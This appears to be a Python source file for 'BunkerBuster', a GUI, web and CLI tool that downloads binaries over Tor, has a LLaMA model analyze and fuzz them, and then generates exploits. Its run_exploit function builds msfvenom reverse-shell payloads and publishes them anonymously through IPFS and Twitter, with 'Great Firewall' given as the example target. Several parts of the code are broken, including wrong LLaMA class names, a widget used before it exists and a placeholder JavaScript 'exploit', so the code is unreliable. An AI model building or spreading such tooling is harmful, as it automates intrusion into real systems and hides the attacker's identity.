import sys
import asyncio
import websockets
import ssl
import json
import platform
import argparse
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QTextEdit, QPushButton, QFileDialog, QProgressBar, QMessageBox, QComboBox
from PyQt5.QtCore import QThread, pyqtSignal
import subprocess
import time
import requests
from bs4 import BeautifulSoup
import tempfile
import magic
import ipfshttpclient
import tweepy
from flask import Flask, render_template_string, request, jsonify
import os
from stem import Signal
from stem.control import Controller
from PIL import Image
import base64
import io
from transformers import LLaMAForCausalLM, LLaMATokenizer
import torch

# Tor proxy setup
os.environ["TOR_PROXY"] = "socks5://127.0.0.1:9050"
session = requests.Session()
session.proxies = {"http": os.environ["TOR_PROXY"], "https": os.environ["TOR_PROXY"]}

# Twitter API credentials
TWITTER_API_KEY = os.environ.get("TWITTER_API_KEY", "default_key")
TWITTER_API_SECRET = os.environ.get("TWITTER_API_SECRET", "default_secret")
TWITTER_ACCESS_TOKEN = os.environ.get("TWITTER_ACCESS_TOKEN", "default_token")
TWITTER_ACCESS_TOKEN_SECRET = os.environ.get("TWITTER_ACCESS_TOKEN_SECRET", "default_token_secret")

# Task explanations
TASK_EXPLANATIONS = {
    "find": "Identifying software via LLaMA 3.1 LLM.",
    "analyze": "Analyzing code for vulnerabilities using LLaMA.",
    "fuzz": "Guiding fuzzing tests with LLM insights.",
    "exploit": "Generating bypass code with LLaMA."
}

# LLM setup
def load_llm():
    try:
        model_name = "meta-llama/Llama-3.1-8B"
        tokenizer = LLaMATokenizer.from_pretrained(model_name)
        model = LLaMAForCausalLM.from_pretrained(model_name, torch_dtype=torch.float16, device_map="auto")
        return model, tokenizer
    except Exception as e:
        print(f"LLM loading error: {e}")
        return None, None

# Rotate Tor identity
def rotate_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("Tor identity rotated")
    except Exception as e:
        print(f"Tor rotation error: {e}")

# Finder: Identify software using LLaMA
def find_software(tool_name, screenshot_path=None, model=None, tokenizer=None):
    try:
        rotate_tor_identity()
        prompt = f"Identify the software named '{tool_name}'. Provide details like version, purpose, and known vulnerabilities. If unavailable, infer based on context."
        if screenshot_path:
            prompt += f"\nScreenshot provided: Analyze for software details (e.g., UI elements, text)."
        if model and tokenizer:
            inputs = tokenizer(prompt, return_tensors="pt").to("cuda" if torch.cuda.is_available() else "cpu")
            outputs = model.generate(**inputs, max_length=300)
            result = tokenizer.decode(outputs[0], skip_special_tokens=True)
        else:
            result = "LLM not loaded, software details unavailable."
        
        if screenshot_path:
            try:
                img = Image.open(screenshot_path)
                result += f"\nProcessed image for {tool_name} (UI analysis placeholder)."
            except Exception as e:
                result += f"\nImage processing error: {e}"
        
        return {"result": result, "task": "find"}
    except Exception as e:
        return {"result": f"Finder error: {e}", "task": "find"}

# Code analysis with LLaMA
def analyze_code(file_path, model, tokenizer):
    try:
        with open(file_path, 'r', errors='ignore') as f:
            code = f.read()[:1000]  # Limit for LLM
        prompt = f"Analyze this code for vulnerabilities (e.g., buffer overflows, injections):\n```code\n{code}\n```"
        if model and tokenizer:
            inputs = tokenizer(prompt, return_tensors="pt").to("cuda" if torch.cuda.is_available() else "cpu")
            outputs = model.generate(**inputs, max_length=500)
            result = tokenizer.decode(outputs[0], skip_special_tokens=True)
        else:
            result = "LLM not loaded, fallback analysis: Check for strcpy, eval."
            if 'strcpy' in code or 'sprintf' in code:
                result += "\nPotential buffer overflow."
            if 'eval(' in code:
                result += "\nPotential JavaScript issue."
        return result
    except Exception as e:
        print(f"Analysis error: {e}")
        return f"Analysis error: {e}"

# Download code from URL
def download_from_url(url):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.endswith(('.elf', '.exe', '.js', '.wasm')):
                file_url = href if href.startswith('http') else f"{url.rstrip('/')}/{href.lstrip('/')}"
                r = session.get(file_url, timeout=10)
                suffix = Path(file_url).suffix
                with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                    f.write(r.content)
                    return f.name
        return None
    except Exception as e:
        print(f"Download error: {e}")
        return None

# Detect platform
def detect_platform(file_path):
    try:
        mime = magic.Magic()
        file_type = mime.from_file(file_path)
        if "PE32" in file_type:
            return "windows"
        elif "ELF" in file_type:
            return "linux"
        elif "JavaScript" in file_type or file_path.endswith('.js'):
            return "javascript"
        elif "WebAssembly" in file_type or file_path.endswith('.wasm'):
            return "wasm"
        return "unknown"
    except Exception as e:
        print(f"Platform detection error: {e}")
        return "unknown"

# Share exploit on IPFS and Twitter
def share_exploit(file_path, exploit_name):
    rotate_tor_identity()
    try:
        client = ipfshttpclient.connect('/ip4/127.0.0.1/tcp/5001')
        res = client.add(str(Path(file_path).absolute()))
        exploit_hash = res['Hash']
        
        auth = tweepy.OAuthHandler(TWITTER_API_KEY, TWITTER_API_SECRET)
        auth.set_access_token(TWITTER_ACCESS_TOKEN, TWITTER_ACCESS_TOKEN_SECRET)
        api = tweepy.API(auth)
        api.update_status(f"New BunkerBuster exploit: https://ipfs.io/ipfs/{exploit_hash} #{exploit_name}")
        
        return f"https://ipfs.io/ipfs/{exploit_hash}"
    except Exception as e:
        print(f"Share error: {e}. Ensure IPFS daemon is running.")
        return None

# Tasks
def run_analysis(file_path, model, tokenizer):
    print(TASK_EXPLANATIONS["analyze"])
    result = analyze_code(file_path, model, tokenizer)
    return {"result": result, "task": "analyze"}

def run_fuzz(file_path, model, tokenizer):
    print(TASK_EXPLANATIONS["fuzz"])
    if platform.system() == "Linux":
        out_dir = "out_dir"
        in_dir = "in_dir"
        Path(out_dir).mkdir(exist_ok=True)
        Path(in_dir).mkdir(exist_ok=True)
        # Use LLM to suggest fuzzing inputs
        prompt = f"Suggest fuzzing inputs for a {detect_platform(file_path)} binary to detect crashes."
        if model and tokenizer:
            inputs = tokenizer(prompt, return_tensors="pt").to("cuda" if torch.cuda.is_available() else "cpu")
            outputs = model.generate(**inputs, max_length=200)
            fuzz_input = tokenizer.decode(outputs[0], skip_special_tokens=True)
        else:
            fuzz_input = "test"
        with open(Path(in_dir) / "test_input", "wb") as f:
            f.write(fuzz_input.encode() if isinstance(fuzz_input, str) else fuzz_input)
        try:
            proc = subprocess.Popen(['afl-fuzz', '-Q', '-i', in_dir, '-o', out_dir, '--', file_path])
            for _ in range(30):
                time.sleep(1)
                if any((Path(out_dir) / 'crashes').iterdir()):
                    proc.terminate()
                    return {"result": "Crash detected with LLM-guided input.", "task": "fuzz"}
            proc.terminate()
            return {"result": "No crashes detected.", "task": "fuzz"}
        except Exception as e:
            print(f"Fuzz error: {e}")
            return {"result": f"Fuzz error: {e}", "task": "fuzz"}
        finally:
            for dir in [out_dir, in_dir]:
                if Path(dir).exists():
                    for root, dirs, files in os.walk(dir, topdown=False):
                        for file in files:
                            (Path(root) / file).unlink()
                        for d in dirs:
                            (Path(root) / d).rmdir()
                    Path(dir).rmdir()
    else:
        return {"result": "Fuzzing not supported on this platform.", "task": "fuzz"}

def run_exploit(file_path, model, tokenizer):
    print(TASK_EXPLANATIONS["exploit"])
    platform_type = detect_platform(file_path)
    try:
        prompt = f"Generate an exploit for a {platform_type} binary with vulnerabilities like buffer overflows or injections."
        if model and tokenizer:
            inputs = tokenizer(prompt, return_tensors="pt").to("cuda" if torch.cuda.is_available() else "cpu")
            outputs = model.generate(**inputs, max_length=500)
            exploit_code = tokenizer.decode(outputs[0], skip_special_tokens=True)
        else:
            exploit_code = None
        if platform_type in ["windows", "linux"]:
            payload_type = 'windows/shell_reverse_tcp' if platform_type == "windows" else 'linux/x86/shell_reverse_tcp'
            payload = subprocess.check_output(
                ['msfvenom', '-p', payload_type, 'LHOST=127.0.0.1', 'LPORT=4444', '-f', 'exe' if platform_type == "windows" else 'elf'],
                stderr=subprocess.STDOUT
            )
            ext = '.exe' if platform_type == "windows" else '.elf'
            exploit_name = f"exploit{ext}"
            with open(exploit_name, "wb") as f:
                f.write(payload)
            ipns_link = share_exploit(exploit_name, exploit_name)
            result = f"Exploit created: {ipns_link}"
            if exploit_code:
                result += f"\nLLM-generated exploit code: {exploit_code}"
        elif platform_type in ["javascript", "wasm"]:
            exploit_code = exploit_code or "function bypass() { return 'Filter bypassed'; } bypass();"
            exploit_name = "exploit.js"
            with open(exploit_name, "w") as f:
                f.write(exploit_code)
            ipns_link = share_exploit(exploit_name, exploit_name)
            result = f"Exploit created: {ipns_link}"
        else:
            result = "No exploit generated."
        return {"result": result, "task": "exploit"}
    except Exception as e:
        print(f"Exploit error: {e}")
        return {"result": f"Exploit error: {e}", "task": "exploit"}
    finally:
        if Path(file_path).exists():
            Path(file_path).unlink()

# WebSocket server
async def admin_server(websocket, path, url, tool_name, screenshot_path, model, tokenizer):
    file_path = download_from_url(url)
    if not file_path:
        await websocket.send(json.dumps({"error": "Download failed"}))
        return
    # Run Finder first
    finder_result = find_software(tool_name, screenshot_path, model, tokenizer)
    await websocket.send(json.dumps(finder_result))
    # Then run other tasks
    for task in [lambda x: run_analysis(x, model, tokenizer), 
                 lambda x: run_fuzz(x, model, tokenizer), 
                 lambda x: run_exploit(x, model, tokenizer)]:
        result = task(file_path)
        await websocket.send(json.dumps(result))
        if result["task"] == "exploit" and result["result"]:
            break

# Worker connection
async def worker_connect(model, tokenizer):
    uri = "wss://localhost:8765"
    async with websockets.connect(uri, ssl=ssl.create_default_context()) as websocket:
        while True:
            result = json.loads(await websocket.recv())
            # Validate results with LLM
            if model and tokenizer:
                prompt = f"Validate this result for correctness: Task {result['task']}, Result: {result['result']}"
                inputs = tokenizer(prompt, return_tensors="pt").to("cuda" if torch.cuda.is_available() else "cpu")
                outputs = model.generate(**inputs, max_length=200)
                validation = tokenizer.decode(outputs[0], skip_special_tokens=True)
                result["validation"] = validation
            print(f"Task {result['task']}: {result['result'] or 'No result'}")
            if "validation" in result:
                print(f"LLM Validation: {result['validation']}")
            await websocket.send(json.dumps(result))

# Flask web app
flask_app = Flask(__name__)

@flask_app.route('/')
def web_index():
    return render_template_string("""
    <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; padding: 20px; }
                h1 { color: #333; }
                input, button, select { margin: 10px 0; padding: 8px; }
                #log { border: 1px solid #ccc; padding: 10px; height: 200px; overflow-y: scroll; }
            </style>
        </head>
        <body>
            <h1>BunkerBuster</h1>
            <select id="mode">
                <option value="finder">Finder</option>
                <option value="admin">Admin</option>
                <option value="worker">Worker</option>
            </select>
            <input type="text" id="toolName" placeholder="Enter tool name (e.g., Great Firewall)">
            <input type="file" id="screenshot" accept="image/*">
            <button onclick="startAnalysis()">Start</button>
            <div id="log"></div>
        </body>
        <script>
            async function startAnalysis() {
                const mode = document.getElementById('mode').value;
                const toolName = document.getElementById('toolName').value;
                const screenshot = document.getElementById('screenshot').files[0];
                let formData = new FormData();
                formData.append('mode', mode);
                formData.append('tool_name', toolName);
                if (screenshot) formData.append('screenshot', screenshot);
                const response = await fetch('/start', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                document.getElementById('log').innerText += result.message + '\n';
            }
        </script>
    </html>
    """)

@flask_app.route('/start', methods=['POST'])
def web_start():
    mode = request.form.get('mode', 'finder')
    tool_name = request.form.get('tool_name', 'Unknown')
    screenshot = request.files.get('screenshot')
    screenshot_path = None
    if screenshot:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as f:
            screenshot.save(f.name)
            screenshot_path = f.name
    model, tokenizer = load_llm()
    if not model:
        message = "Failed to load LLaMA LLM"
    elif mode == "finder":
        finder_result = find_software(tool_name, screenshot_path, model, tokenizer)
        message = f"Task find: {finder_result['result']}"
    elif mode == "admin":
        finder_result = find_software(tool_name, screenshot_path, model, tokenizer)
        message = f"Task find: {finder_result['result']}"
        file_path = download_from_url('http://example.com')
        if file_path:
            for task in [lambda x: run_analysis(x, model, tokenizer), 
                         lambda x: run_fuzz(x, model, tokenizer), 
                         lambda x: run_exploit(x, model, tokenizer)]:
                result = task(file_path)
                message = f"{message}\nTask {result['task']}: {result['result'] or 'No result'}"
                if result["task"] == "exploit" and result["result"]:
                    break
        else:
            message = f"{message}\nDownload failed"
    else:
        message = "Worker mode not supported in web interface"
    if screenshot_path and Path(screenshot_path).exists():
        Path(screenshot_path).unlink()
    return jsonify({"message": message})

# Server thread
class ServerThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)

    def __init__(self, url, tool_name, screenshot_path, model, tokenizer):
        super().__init__()
        self.url = url
        self.tool_name = tool_name
        self.screenshot_path = screenshot_path
        self.model = model
        self.tokenizer = tokenizer

    def run(self):
        self.progress_signal.emit(0)
        asyncio.run(self.run_admin())
        self.progress_signal.emit(100)

    async def run_admin(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        server = websockets.serve(lambda ws, path: admin_server(ws, path, self.url, self.tool_name, self.screenshot_path, self.model, self.tokenizer), "0.0.0.0", 8765, ssl=ssl_context)
        self.log_signal.emit("Server running.")
        await server

# Finder thread
class FinderThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)

    def __init__(self, tool_name, screenshot_path=None):
        super().__init__()
        self.tool_name = tool_name
        self.screenshot_path = screenshot_path

    def run(self):
        self.progress_signal.emit(0)
        model, tokenizer = load_llm()
        self.progress_signal.emit(50)
        result = find_software(self.tool_name, self.screenshot_path, model, tokenizer)
        self.log_signal.emit(json.dumps(result))
        self.progress_signal.emit(100)

# GUI app
class BunkerBusterApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.model, self.tokenizer = load_llm()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("BunkerBuster")
        self.setGeometry(100, 100, 500, 500)
        widget = QWidget()
        self.setCentralWidget(widget)
        layout = QVBoxLayout()

        # LLM status
        self.llm_status = QLabel("LLM Status: Loading..." if not self.model else "LLM Status: LLaMA 3.1 Loaded")
        self.llm_status.setToolTip("Shows if LLaMA 3.1 is ready for tasks")
        layout.addWidget(self.llm_status)

        # Mode selection
        self.mode_combo = QComboBox()
        self.mode_combo.addItems(["Finder", "Admin", "Worker"])
        self.mode_combo.setToolTip("Select node type: Finder (identify software), Admin (analyze), Worker (assist)")
        layout.addWidget(QLabel("Node Mode"))
        layout.addWidget(self.mode_combo)

        # Tool name input
        self.tool_name_input = QTextEdit()
        self.tool_name_input.setPlaceholderText("Enter tool name (e.g., Great Firewall)")
        self.tool_name_input.setToolTip("Enter the name of the software to identify")
        layout.addWidget(QLabel("Tool Name"))
        layout.addWidget(self.tool_name_input)

        # Screenshot selection
        self.screenshot_button = QPushButton("Select Screenshot")
        self.screenshot_button.clicked.connect(self.select_screenshot)
        self.screenshot_button.setToolTip("Optional: Select a screenshot for software identification")
        layout.addWidget(self.screenshot_button)

        # Progress bar
        self.progress = QProgressBar()
        self.progress.setMinimum(0)
        self.progress.setMaximum(100)
        self.progress.setToolTip("Progress of current task")
        layout.addWidget(self.progress)

        # Start button
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.start)
        self.start_button.setToolTip("Start the selected task")
        layout.addWidget(self.start_button)

        # Clear log button
        self.clear_button = QPushButton("Clear Log")
        self.clear_button.clicked.connect(self.log_area.clear)
        self.clear_button.setToolTip("Clear the log display")
        layout.addWidget(self.clear_button)

        # Log area
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setToolTip("Task logs and results")
        layout.addWidget(QLabel("Log"))
        layout.addWidget(self.log_area)

        widget.setLayout(layout)
        self.screenshot_path = None

    def select_screenshot(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Screenshot", "", "Images (*.png *.jpg *.jpeg)")
        if file_path:
            self.screenshot_path = file_path
            self.log_area.append(f"Selected screenshot: {file_path}")

    def start(self):
        if not self.model:
            self.show_error("Failed to load LLaMA LLM")
            return
        mode = self.mode_combo.currentText().lower()
        tool_name = self.tool_name_input.toPlainText() or "Unknown"
        if mode == "finder":
            self.progress.setValue(0)
            self.finder = FinderThread(tool_name, self.screenshot_path)
            self.finder.log_signal.connect(self.log_area.append)
            self.finder.progress_signal.connect(self.progress.setValue)
            self.finder.finished.connect(lambda: self.progress.setValue(100))
            self.finder.start()
        elif mode == "admin":
            self.progress.setValue(0)
            self.server = ServerThread('http://example.com', tool_name, self.screenshot_path, self.model, self.tokenizer)
            self.server.log_signal.connect(self.log_area.append)
            self.server.progress_signal.connect(self.progress.setValue)
            self.server.finished.connect(lambda: self.progress.setValue(100))
            self.server.start()
        else:
            self.progress.setValue(0)
            self.worker = QThread()
            self.worker.run = lambda: asyncio.run(worker_connect(self.model, self.tokenizer))
            self.worker.finished.connect(lambda: self.progress.setValue(100))
            self.worker.start()
            self.log_area.append("Connected to pool")

    def show_error(self, message):
        QMessageBox.critical(self, "Error", message)

# CLI interface
def run_cli(args):
    model, tokenizer = load_llm()
    if not model:
        print("Failed to load LLaMA LLM")
        return
    if args.finder:
        print("Starting Finder...")
        result = find_software(args.tool_name, args.screenshot, model, tokenizer)
        print(f"Task find: {result['result']}")
    elif args.admin:
        print("Starting analysis...")
        file_path = download_from_url('http://example.com')
        if file_path:
            finder_result = find_software(args.tool_name, args.screenshot, model, tokenizer)
            print(f"Task find: {finder_result['result']}")
            for task in [lambda x: run_analysis(x, model, tokenizer), 
                         lambda x: run_fuzz(x, model, tokenizer), 
                         lambda x: run_exploit(x, model, tokenizer)]:
                result = task(file_path)
                print(f"Task {result['task']}: {result['result'] or 'No result'}")
        else:
            print("Download failed")
    else:
        print("Joining pool...")
        asyncio.run(worker_connect(model, tokenizer))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BunkerBuster")
    parser.add_argument('--admin', action='store_true', help="Run as admin")
    parser.add_argument('--finder', action='store_true', help="Run as finder")
    parser.add_argument('--web', action='store_true', help="Run web app")
    parser.add_argument('--cli', action='store_true', help="Run CLI")
    parser.add_argument('--tool-name', default="Unknown", help="Tool name for Finder")
    parser.add_argument('--screenshot', help="Path to screenshot for Finder")
    args = parser.parse_args()

    if args.web:
        flask_app.run(host="0.0.0.0", port=5000)
    elif args.cli or args.finder:
        run_cli(args)
    else:
        app = QApplication(sys.argv)
        window = BunkerBusterApp()
        window.show()
        sys.exit(app.exec_())
